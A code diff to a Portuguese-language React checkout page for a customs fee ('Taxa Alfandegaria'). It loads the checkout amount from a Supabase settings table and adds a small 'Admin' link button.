@@ -1,4 +1,5 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { supabase } from "@/integrations/supabase/client";
 import { CheckoutForm } from "@/components/checkout/CheckoutForm";
 import { OrderSummary } from "@/components/checkout/OrderSummary";
 import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
@@ -17,6 +18,32 @@ const Index = () => {
   const [showPhoneModal, setShowPhoneModal] = useState(false);
   const [confirmedPhone, setConfirmedPhone] = useState("");
   const [showPayment, setShowPayment] = useState(false);
+  const [totalAmount, setTotalAmount] = useState(214.80);
+  const [loadingAmount, setLoadingAmount] = useState(true);
+
+  useEffect(() => {
+    fetchAmount();
+  }, []);
+
+  const fetchAmount = async () => {
+    try {
+      const { data, error } = await supabase
+        .from("settings")
+        .select("value")
+        .eq("key", "checkout_amount")
+        .single();
+
+      if (error) throw error;
+
+      if (data) {
+        setTotalAmount(parseFloat(data.value));
+      }
+    } catch (error) {
+      console.error("Erro ao buscar valor:", error);
+    } finally {
+      setLoadingAmount(false);
+    }
+  };
 
   const handleCustomerDataFilled = (data: CustomerData) => {
     setCustomerData(data);
@@ -28,8 +55,6 @@ const Index = () => {
     setShowPhoneModal(false);
     setShowPayment(true);
   };
-
-  const totalAmount = 214.80;
 
   return (
     <div className="min-h-screen bg-background">
@@ -93,6 +118,12 @@ const Index = () => {
           <div className="text-sm text-muted-foreground space-y-1">
             <p className="font-bold text-navy text-base">Taxa Alfandegaria</p>
             <p>CNPJ: 34.028.316/0001-03</p>
+            <button
+              onClick={() => window.location.href = '/admin'}
+              className="text-xs text-muted-foreground/50 hover:text-muted-foreground mt-2 transition-colors"
+            >
+              Admin
+            </button>
           </div>
         </div>
       </div>
